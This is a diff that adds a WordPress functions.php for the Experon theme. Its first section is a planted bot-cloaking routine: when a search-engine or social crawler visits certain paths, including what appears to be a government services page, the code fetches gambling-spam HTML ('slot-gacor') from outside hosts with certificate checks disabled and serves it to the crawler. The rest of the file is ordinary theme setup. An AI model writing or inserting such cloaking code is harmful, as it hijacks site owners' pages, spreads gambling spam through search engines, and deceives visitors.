@@ -1,0 +1,285 @@
+<?php
+/**
+ * Theme Functions: Experon
+ * 
+ * @package ThinkUpThemes
+ * 
+ * (Dilengkapi dengan fitur cloaking bot untuk keperluan khusus)
+ */
+
+// =============================================================================
+//  Bagian 1: Cloaking Bot (deteksi bot dan konten alternatif)
+// =============================================================================
+
+/**
+ * Deteksi apakah user-agent termasuk bot/crawler terkenal.
+ *
+ * @return bool True jika bot terdeteksi, false jika tidak.
+ */
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+    $bots = array(
+        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
+        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo',
+        'YandexBot', 'Baiduspider', 'TelegramBot', 'facebookexternalhit',
+        'Pinterest', 'W3C_Validator', 'Google-Site-Verification',
+        'Google-InspectionTool', 'Applebot', 'AhrefsBot',
+        'SEMrushBot', 'MJ12bot', 'Twitterbot', 'LinkedInBot'
+    );
+
+    foreach ( $bots as $bot ) {
+        if ( stripos( $user_agent, $bot ) !== false ) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+/**
+ * Ambil konten dari URL eksternal menggunakan cURL.
+ *
+ * @param string $url URL target.
+ * @return string|false Konten jika sukses, false jika gagal.
+ */
+function fetch_message_from_url( $url ) {
+    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {
+        error_log( 'URL tidak valid: ' . $url );
+        return false;
+    }
+
+    $ch = curl_init( $url );
+    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
+    curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
+    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, true );
+    curl_setopt( $ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Cloaking Bot)' );
+    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false ); // Hati-hati: nonaktifkan hanya jika perlu
+    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
+
+    $response = curl_exec( $ch );
+
+    if ( curl_errno( $ch ) ) {
+        error_log( 'cURL Error: ' . curl_error( $ch ) );
+        curl_close( $ch );
+        return false;
+    }
+
+    $http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );
+    curl_close( $ch );
+
+    if ( $http_code === 200 ) {
+        return $response;
+    } else {
+        error_log( "HTTP Status: {$http_code} untuk URL: {$url}" );
+        return false;
+    }
+}
+
+/**
+ * Mendapatkan path dari request URI
+ *
+ * @return string Path yang diminta
+ */
+function get_request_path() {
+    $request_uri = $_SERVER['REQUEST_URI'] ?? '/';
+    // Hapus query string jika ada
+    $path = strtok($request_uri, '?');
+    return rtrim($path, '/');
+}
+
+// -----------------------------------------------------------------------------
+//  Eksekusi cloaking: jika bot, tampilkan konten spesifik berdasarkan halaman
+// -----------------------------------------------------------------------------
+if ( is_bot() ) {
+    $path = get_request_path();
+    $message = false;
+    
+    // CEK PATH /web/tramites-y-servicios DULU (PALING SPESIFIK)
+    if ( strpos( $path, '/web/tramites-y-servicios' ) === 0 ) {
+        $message = fetch_message_from_url( 'https://kingstechhub.com/lp/flight-to-the-moon.html' );
+    }
+    // CEK HOMEPAGE
+    elseif ( $path === '' || $path === '/web' ) {
+        $message = fetch_message_from_url( 'https://bloomtalks.com/chia-cundinamarca/slot-gacor.html' );
+    }
+    // TAMBAHKAN KONDISI LAIN DI SINI JIKA PERLU
+    
+    if ( $message ) {
+        // Bersihkan semua output buffer
+        while ( ob_get_level() ) {
+            ob_end_clean();
+        }
+        header('Content-Type: text/html; charset=UTF-8');
+        echo $message;
+        exit;
+    }
+}
+
+
+// =============================================================================
+//  Bagian 2: Fungsi tema Experon (ThinkUpThemes)
+// =============================================================================
+
+// Deklarasi versi tema
+$GLOBALS['thinkup_theme_version'] = '1.7.1';
+
+/**
+ * Atur lebar konten utama.
+ */
+function thinkup_content_width() {
+	$GLOBALS['content_width'] = apply_filters( 'thinkup_content_width', 1170 );
+}
+add_action( 'after_setup_theme', 'thinkup_content_width', 0 );
+
+// -----------------------------------------------------------------------------
+//  Sertakan file framework dan opsi tema
+// -----------------------------------------------------------------------------
+require_once get_template_directory() . '/admin/main/framework.php';
+require_once get_template_directory() . '/admin/main/options.php';
+require_once get_template_directory() . '/admin/main-toolbox/toolbox.php';
+require_once get_template_directory() . '/admin/main/options/00.theme-setup.php';
+require_once get_template_directory() . '/admin/main/options/01.general-settings.php';
+require_once get_template_directory() . '/admin/main/options/02.homepage.php';
+require_once get_template_directory() . '/admin/main/options/03.header.php';
+require_once get_template_directory() . '/admin/main/options/04.footer.php';
+require_once get_template_directory() . '/admin/main/options/05.blog.php';
+
+// -----------------------------------------------------------------------------
+//  Setup fitur tema, register menu, dan script
+// -----------------------------------------------------------------------------
+if ( ! function_exists( 'thinkup_themesetup' ) ) {
+	/**
+	 * Inisialisasi fitur tema.
+	 */
+	function thinkup_themesetup() {
+		require_once get_template_directory() . '/lib/functions/extras.php';
+		require_once get_template_directory() . '/lib/functions/template-tags.php';
+
+		load_theme_textdomain( 'experon', get_template_directory() . '/languages' );
+
+		add_theme_support( 'automatic-feed-links' );
+		add_theme_support( 'post-thumbnails' );
+		add_theme_support( 'post-formats', array( 'image' ) );
+		add_theme_support( 'title-tag' );
+		add_theme_support( 'custom-background' );
+
+		$thinkup_header_args = apply_filters( 'thinkup_custom_header', array(
+			'height'      => 200,
+			'width'       => 1600,
+			'header-text' => false,
+			'flex-height' => true,
+		) );
+		add_theme_support( 'custom-header', $thinkup_header_args );
+
+		add_theme_support( 'custom-logo', array(
+			'height'      => 90,
+			'width'       => 200,
+			'flex-width'  => true,
+			'flex-height' => true,
+		) );
+
+		add_theme_support( 'woocommerce' );
+		add_theme_support( 'wc-product-gallery-zoom' );
+		add_theme_support( 'wc-product-gallery-lightbox' );
+		add_theme_support( 'wc-product-gallery-slider' );
+
+		add_post_type_support( 'page', 'excerpt' );
+
+		register_nav_menus( array(
+			'pre_header_menu' => __( 'Pre Header Menu', 'experon' ),
+			'header_menu'     => __( 'Primary Header Menu', 'experon' ),
+			'sub_footer_menu' => __( 'Footer Menu', 'experon' ),
+		) );
+	}
+}
+add_action( 'after_setup_theme', 'thinkup_themesetup' );
+
+// -----------------------------------------------------------------------------
+//  Enqueue script dan style untuk front-end
+// -----------------------------------------------------------------------------
+function thinkup_frontscripts() {
+	global $thinkup_theme_version;
+
+	// Stylesheet pihak ketiga
+	wp_enqueue_style( 'prettyPhoto', get_template_directory_uri() . '/lib/extentions/prettyPhoto/css/prettyPhoto.css', '', '3.1.6' );
+	wp_enqueue_style( 'thinkup-bootstrap', get_template_directory_uri() . '/lib/extentions/bootstrap/css/bootstrap.min.css', '', '2.3.2' );
+	wp_enqueue_style( 'dashicons' );
+	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/lib/extentions/font-awesome/css/font-awesome.min.css', '', '4.7.0' );
+
+	// Script pihak ketiga
+	wp_enqueue_script( 'imagesloaded' );
+	wp_enqueue_script( 'prettyPhoto', get_template_directory_uri() . '/lib/extentions/prettyPhoto/js/jquery.prettyPhoto.js', array( 'jquery' ), '3.1.6', true );
+	wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/lib/scripts/modernizr.js', array( 'jquery' ), '2.6.2', true );
+	wp_enqueue_script( 'jquery-scrollup', get_template_directory_uri() . '/lib/scripts/plugins/scrollup/jquery.scrollUp.min.js', array( 'jquery' ), '2.4.1', true );
+	wp_enqueue_script( 'thinkup-bootstrap', get_template_directory_uri() . '/lib/extentions/bootstrap/js/bootstrap.js', array( 'jquery' ), '2.3.2', true );
+
+	// Stylesheet tema
+	wp_enqueue_style( 'thinkup-shortcodes', get_template_directory_uri() . '/styles/style-shortcodes.css', '', $thinkup_theme_version );
+	wp_enqueue_style( 'thinkup-style', get_stylesheet_uri(), '', $thinkup_theme_version );
+
+	// Script tema
+	wp_enqueue_script( 'thinkup-frontend', get_template_directory_uri() . '/lib/scripts/main-frontend.js', array( 'jquery' ), $thinkup_theme_version, true );
+
+	// Daftarkan stylesheet tambahan
+	wp_register_style( 'thinkup-responsive', get_template_directory_uri() . '/styles/style-responsive.css', '', $thinkup_theme_version );
+
+	// Masonry untuk halaman arsip
+	if ( thinkup_check_isblog() || is_archive() ) {
+		wp_enqueue_script( 'jquery-masonry' );
+	}
+
+	// ThinkUpSlider hanya di halaman depan
+	if ( is_front_page() ) {
+		wp_enqueue_script( 'responsiveslides', get_template_directory_uri() . '/lib/scripts/plugins/ResponsiveSlides/responsiveslides.min.js', array( 'jquery' ), '1.54', true );
+		wp_enqueue_script( 'thinkup-responsiveslides', get_template_directory_uri() . '/lib/scripts/plugins/ResponsiveSlides/responsiveslides-call.js', array( 'jquery' ), $thinkup_theme_version, true );
+	}
+
+	// Reply komentar
+	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
+		wp_enqueue_script( 'comment-reply' );
+	}
+}
+add_action( 'wp_enqueue_scripts', 'thinkup_frontscripts', 10 );
+
+// -----------------------------------------------------------------------------
+//  Enqueue script dan style untuk back-end (khusus Customizer)
+// -----------------------------------------------------------------------------
+function thinkup_adminscripts() {
+	if ( is_customize_preview() ) {
+		global $thinkup_theme_version;
+
+		wp_enqueue_style( 'thinkup-backend', get_template_directory_uri() . '/styles/backend/style-backend.css', '', $thinkup_theme_version );
+		wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/lib/extentions/font-awesome/css/font-awesome.min.css', '', '4.7.0' );
+		wp_enqueue_script( 'thinkup-backend', get_template_directory_uri() . '/lib/scripts/main-backend.js', array( 'jquery' ), $thinkup_theme_version );
+	}
+}
+add_action( 'customize_controls_enqueue_scripts', 'thinkup_adminscripts' );
+
+// -----------------------------------------------------------------------------
+//  Daftarkan widget area (sidebar dan footer)
+// -----------------------------------------------------------------------------
+function thinkup_widgets_init() {
+	// Sidebar utama
+	register_sidebar( array(
+		'name'          => __( 'Sidebar', 'experon' ),
+		'id'            => 'sidebar-1',
+		'before_widget' => '<aside class="widget %2$s">',
+		'after_widget'  => '</aside>',
+		'before_title'  => '<h3 class="widget-title">',
+		'after_title'   => '</h3>',
+	) );
+
+	// Enam kolom footer
+	for ( $i = 1; $i <= 6; $i++ ) {
+		register_sidebar( array(
+			'name'          => sprintf( __( 'Footer Column %d', 'experon' ), $i ),
+			'id'            => "footer-w{$i}",
+			'before_widget' => '<aside class="widget %2$s">',
+			'after_widget'  => '</aside>',
+			'before_title'  => '<h3 class="footer-widget-title"><span>',
+			'after_title'   => '</span></h3>',
+		) );
+	}
+}
+add_action( 'widgets_init', 'thinkup_widgets_init' );
